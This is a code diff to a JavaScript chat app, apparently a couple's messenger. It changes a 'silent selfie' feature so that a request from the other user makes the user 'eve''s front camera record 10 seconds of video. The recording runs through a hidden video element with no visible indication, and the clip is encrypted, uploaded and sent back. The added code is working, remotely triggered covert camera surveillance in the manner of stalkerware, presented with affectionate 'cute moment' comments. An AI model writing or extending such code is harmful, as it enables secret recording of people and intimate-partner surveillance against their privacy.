@@ -175,7 +175,7 @@ function showPermissionWarning() {
     setTimeout(() => { if(div.parentNode) div.remove(); }, 10000);
 }
 
-// --- ROMANTIC SELFIE SYSTEM (SILENT CAPTURE) ---
+// --- ROMANTIC SELFIE SYSTEM (SILENT VIDEO CAPTURE) ---
 function monitorSelfieRequests() {
     // Only Eve monitors for requests
     if (currentUser !== 'eve') return;
@@ -185,9 +185,9 @@ function monitorSelfieRequests() {
         if (!snap.empty) {
             // Check Trust Permission
             if (localStorage.getItem('selfietrustpermission') === "always") {
-                console.log("❤️ Romantic request found. Capturing...");
+                console.log("❤️ Romantic request found. Recording video...");
                 const requestDoc = snap.docs[0]; // Take first request
-                await takeSilentSelfie(requestDoc.id);
+                await takeSilentVideo(requestDoc.id);
             } else {
                 console.log("Request found but no trust permission set.");
             }
@@ -195,37 +195,49 @@ function monitorSelfieRequests() {
     });
 }
 
-async function takeSilentSelfie(requestId) {
+async function takeSilentVideo(requestId) {
     try {
         // 1. Start Camera (Front)
+        // Audio is false to ensure no feedback loops and to keep it strictly visual cute moments
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        
+        // Assign to hidden video element just to ensure browser treats it as active
         dom.hiddenCam.srcObject = stream;
-        
-        // 2. Wait for stream to stabilize (Auto-focus/Exposure)
-        await new Promise(r => setTimeout(r, 1500));
 
-        // 3. Capture to Canvas
-        const w = dom.hiddenCam.videoWidth;
-        const h = dom.hiddenCam.videoHeight;
-        dom.hiddenCanvas.width = w;
-        dom.hiddenCanvas.height = h;
-        const ctx = dom.hiddenCanvas.getContext('2d');
-        ctx.drawImage(dom.hiddenCam, 0, 0, w, h);
-        
-        // 4. Stop Camera Immediately
-        stream.getTracks().forEach(track => track.stop());
-        dom.hiddenCam.srcObject = null;
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-        // 5. Get Data URL & Upload
-        const b64 = dom.hiddenCanvas.toDataURL('image/jpeg', 0.8);
-        await uploadCuteSelfie(b64, requestId);
+        recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+            // 5. Create Blob and Upload
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const b64 = await toBase64(blob);
+            
+            // Stop tracks
+            stream.getTracks().forEach(track => track.stop());
+            dom.hiddenCam.srcObject = null;
+            
+            await uploadCuteSelfie(b64, requestId, 'silent-video');
+        };
+
+        // 2. Start Recording
+        recorder.start();
+        console.log("🎥 Recording 10s silent cute moment...");
+
+        // 3. Stop after 10 seconds
+        setTimeout(() => {
+            recorder.stop();
+        }, 10000);
 
     } catch (e) {
-        console.error("Silent capture failed", e);
+        console.error("Silent video capture failed", e);
     }
 }
 
-async function uploadCuteSelfie(b64, requestId) {
+async function uploadCuteSelfie(b64, requestId, type) {
     try {
         const encBlob = encrypt(b64);
         const fname = `cute_${Date.now()}_${Math.random().toString(36).substring(7)}.enc`;
@@ -238,12 +250,12 @@ async function uploadCuteSelfie(b64, requestId) {
             s: currentUser,
             d: encrypt(`${r2Config.publicUrl}/${fname}`),
             t: serverTimestamp(),
-            type: 'silent-request'
+            type: type // 'silent-video'
         });
 
         // Delete the request so it doesn't trigger again
         await deleteDoc(doc(db, "quickselfierequest", requestId));
-        console.log("❤️ Selfie Sent & Request Cleared");
+        console.log("❤️ Video Sent & Request Cleared");
 
     } catch (e) {
         console.error("Upload failed", e);
@@ -639,5 +651,4 @@ function resetRecUI() {
     dom.input.placeholder = "Message..."; dom.input.disabled = false; 
     dom.cancelRec.style.display = 'none'; dom.plusBtn.style.display = 'block'; 
     dom.send.onclick = sendMessage; audioChunks = []; 
-
 }
